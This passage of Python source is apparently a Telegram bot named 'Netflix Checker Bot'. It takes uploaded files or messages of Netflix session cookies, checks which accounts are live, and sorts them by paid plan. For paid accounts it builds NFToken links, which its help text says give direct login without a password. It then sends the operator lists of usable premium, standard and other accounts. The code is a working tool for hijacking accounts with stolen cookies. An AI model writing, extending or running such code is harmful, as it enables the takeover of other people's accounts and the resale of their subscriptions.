        f"📁 Supported formats:\n"
        f"   ├─ .txt (Netscape format)\n"
        f"   ├─ .json (JSON format)\n"
        f"   ├─ .zip (Archive)\n"
        f"   └─ Direct text message ✨\n\n"
        f"⚙️ Commands:\n"
        f"   ├─ /start - Main menu\n"
        f"   ├─ /help - This help\n"
        f"   ├─ /stats - Statistics\n"
        f"   └─ /cancel - Stop current task\n\n"
        f"🔑 NFToken Info:\n"
        f"   The NFToken link allows direct login to Netflix\n"
        f"   without password. It expires after approximately 1 hour."
    )
    await update.message.reply_text(text)

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global total_accounts, results
    
    if total_accounts == 0:
        await update.message.reply_text("📭 No statistics available.\nSend me some cookies files first!")
        return
    
    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile
    
    text = (
        f"📊 Statistics:\n\n"
        f"📁 Total Accounts: {total_accounts}\n"
        f"✅ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   └─ 📱 Mobile: {mobile}\n"
        f"❌ Invalid/Free: {invalid}"
    )
    await update.message.reply_text(text)

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, stop_flag
    if checking:
        stop_flag = True
        checking = False
        await update.message.reply_text("🛑 Task cancelled by user.")
    else:
        await update.message.reply_text("⚠️ No active task to cancel.")

# ======================== معالجة الملفات ========================
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, results, total_accounts, processed, chat_id, msg_id, stop_flag
    
    if checking:
        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
        return
    
    doc = update.message.document
    if not doc:
        return
    
    filename = doc.file_name
    ext = os.path.splitext(filename)[1].lower()
    
    if ext not in [".txt", ".json", ".zip"]:
        await update.message.reply_text(f"❌ Unsupported format: {ext}\n\nSupported: .txt , .json , .zip")
        return
    
    await update.message.reply_text(f"📥 Received: {filename}\n\n🔄 Extracting accounts...")
    
    file = await context.bot.get_file(doc.file_id)
    file_bytes = await file.download_as_bytearray()
    
    all_accounts = []
    
    if ext == ".zip":
        try:
            with zipfile.ZipFile(BytesIO(file_bytes)) as zf:
                for name in zf.namelist():
                    if name.lower().endswith((".txt", ".json")):
                        with zf.open(name) as f:
                            content = f.read().decode("utf-8", errors="ignore")
                            accounts = extract_all_cookies_from_file(content)
                            for acc in accounts:
                                acc["source"] = name
                                all_accounts.append(acc)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to extract ZIP file: {str(e)[:50]}")
            return
    else:
        content = file_bytes.decode("utf-8", errors="ignore")
        accounts = extract_all_cookies_from_file(content)
        for acc in accounts:
            acc["source"] = filename
            all_accounts.append(acc)
    
    if not all_accounts:
        await update.message.reply_text("❌ No valid cookies found in file!")
        return
    
    total_accounts = len(all_accounts)
    await update.message.reply_text(f"✅ Found {total_accounts} accounts in file\n\n🚀 Starting scan...")
    
    checking = True
    stop_flag = False
    results = {}
    processed = 0
    chat_id = update.effective_chat.id
    start_time = time.time()
    
    msg = await context.bot.send_message(chat_id, "🔄 Processing Started...")
    msg_id = msg.message_id
    
    for idx, account in enumerate(all_accounts):
        if stop_flag:
            break
        
        processed = idx + 1
        await update_progress(context)
        
        cookies = account["cookies"]
        source = account["source"]
        
        netflix_id = cookies.get("NetflixId")
        
        info, error = get_account_info(cookies)
        
        if error or not info:
            results[f"{source}_acc_{idx+1}"] = {
                "plan_key": "invalid",
                "plan": "Invalid",
                "details": f"❌ Error: {error or 'Unknown'}",
            }
            continue
        
        plan_key, plan_display, is_paid = determine_plan(info)
        
        pc_link = None
        if is_paid and netflix_id:
            token = create_nftoken_link(netflix_id)
            if token:
                pc_link = create_pc_link(token)
        
        details = format_account_details_for_file(info, pc_link)
        
        results[f"{source}_acc_{idx+1}"] = {
            "plan_key": plan_key,
            "plan": plan_display,
            "details": details,
        }
        
        time.sleep(0.05)
    
    checking = False
    
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except:
        pass
    
    elapsed = time.time() - start_time
    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile
    speed = valid / elapsed if elapsed > 0 else 0
    
    result_text = (
        f"✅ Processing Complete\n\n"
        f"📊 Final Statistics:\n"
        f"   ├─ Total Accounts Scanned: {total_accounts}\n"
        f"   ├─ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid/Free: {invalid}\n"
        f"   ├─ Time Taken: {elapsed:.2f} seconds\n"
        f"   └─ Speed: {speed:.2f} accounts/second"
    )
    
    await context.bot.send_message(chat_id, result_text)
    
    plan_files = {
        "premium": "PREMIUM_ACCOUNTS.txt",
        "standard": "STANDARD_ACCOUNTS.txt",
        "standard_with_ads": "STANDARD_WITH_ADS_ACCOUNTS.txt",
        "basic": "BASIC_ACCOUNTS.txt",
        "mobile": "MOBILE_ACCOUNTS.txt",
    }
    
    for plan_key, out_filename in plan_files.items():
        plan_results = [(name, data) for name, data in results.items() if data.get("plan_key") == plan_key]
        if not plan_results:
            continue
        
        content = f"🎬 NETFLIX ACCOUNTS - {plan_key.upper()}\n{'=' * 50}\n\n"
        for acc_name, data in plan_results:
            content += f"{data.get('details', 'No details')}\n"
            content += f"\n{'-' * 40}\n\n"
        
        try:
            encoded_content = content.encode("utf-8", errors="ignore")
            await context.bot.send_document(
                chat_id=chat_id,
                document=BytesIO(encoded_content),
                filename=out_filename
            )
        except Exception as e:
            print(f"[ERROR] Failed to send {out_filename}: {e}")
    
    if valid == 0:
        await context.bot.send_message(chat_id, "⚠️ No valid paid accounts found in the file!")

# ======================== معالجة النص المباشر ========================
async def handle_text_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global checking, results, total_accounts, processed, chat_id, msg_id, stop_flag

    if checking:
        await update.message.reply_text("⚠️ A scan is already running!\nPlease wait or use /cancel to stop.")
        return

    text = update.message.text.strip()
    
    if text.startswith('/'):
        return

    if 'NetflixId' not in text:
        return

    await update.message.reply_text("🔍 Detected cookies in your message!\n\n🔄 Extracting accounts from text...")

    all_accounts = extract_all_cookies_from_file(text)

    if not all_accounts:
        await update.message.reply_text("❌ No valid cookies found in your message!")
        return

    total_accounts = len(all_accounts)
    await update.message.reply_text(f"✅ Found {total_accounts} account(s) in your message\n\n🚀 Starting scan...")

    checking = True
    stop_flag = False
    results = {}
    processed = 0
    chat_id = update.effective_chat.id
    start_time = time.time()

    msg = await context.bot.send_message(chat_id, "🔄 Processing cookies...")
    msg_id = msg.message_id

    for idx, account in enumerate(all_accounts):
        if stop_flag:
            break

        processed = idx + 1
        await update_progress(context)

        cookies = account["cookies"]
        source = "text_message"

        netflix_id = cookies.get("NetflixId")

        info, error = get_account_info(cookies)

        if error or not info:
            results[f"{source}_acc_{idx+1}"] = {
                "plan_key": "invalid",
                "plan": "Invalid",
                "details": f"❌ Error: {error or 'Unknown'}",
                "pc_link": None,
                "mobile_link": None,
            }
            continue

        plan_key, plan_display, is_paid = determine_plan(info)

        pc_link = None
        mobile_link = None
        if is_paid and netflix_id:
            token = create_nftoken_link(netflix_id)
            if token:
                pc_link = create_pc_link(token)
                mobile_link = create_mobile_link(token)

        details, keyboard = format_account_details_for_chat(info, pc_link, mobile_link)

        results[f"{source}_acc_{idx+1}"] = {
            "plan_key": plan_key,
            "plan": plan_display,
            "details": details,
            "keyboard": keyboard,
        }

        time.sleep(0.05)

    checking = False

    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=msg_id)
    except:
        pass

    elapsed = time.time() - start_time
    premium = sum(1 for r in results.values() if r.get("plan_key") == "premium")
    standard = sum(1 for r in results.values() if r.get("plan_key") in ["standard", "standard_with_ads"])
    basic = sum(1 for r in results.values() if r.get("plan_key") == "basic")
    mobile = sum(1 for r in results.values() if r.get("plan_key") == "mobile")
    invalid = sum(1 for r in results.values() if r.get("plan_key") == "invalid")
    valid = premium + standard + basic + mobile
    speed = valid / elapsed if elapsed > 0 else 0

    result_text = (
        f"✅ Processing Complete\n\n"
        f"📊 Final Statistics:\n"
        f"   ├─ Total Accounts Scanned: {total_accounts}\n"
        f"   ├─ Valid Paid Accounts: {valid}\n"
        f"   ├─ 💎 Premium: {premium}\n"
        f"   ├─ 📺 Standard: {standard}\n"
        f"   ├─ 🔰 Basic: {basic}\n"
        f"   ├─ 📱 Mobile: {mobile}\n"
        f"   └─ ❌ Invalid/Free: {invalid}\n"
        f"   ├─ Time Taken: {elapsed:.2f} seconds\n"
        f"   └─ Speed: {speed:.2f} accounts/second"
    )

    await context.bot.send_message(chat_id, result_text)

    if valid > 0:
        for acc_name, data in results.items():
            if data.get("plan_key") != "invalid":
                details = data.get('details', '')
                keyboard = data.get('keyboard', None)
                
                if details:
                    if keyboard:
                        await context.bot.send_message(chat_id, details, reply_markup=keyboard)
                    else:
                        await context.bot.send_message(chat_id, details)
    else:
        await context.bot.send_message(chat_id, "⚠️ No valid paid accounts found in your message!")

    if invalid > 0:
        await context.bot.send_message(chat_id, f"⚠️ Invalid/Free accounts: {invalid}\n(These were skipped)")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cookies))
    
    print("=" * 50)
    print("✅ Netflix Checker Bot is running...")
    print("✅ Now reads ALL cookies in the file (not just the first one)")
    print("=" * 50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
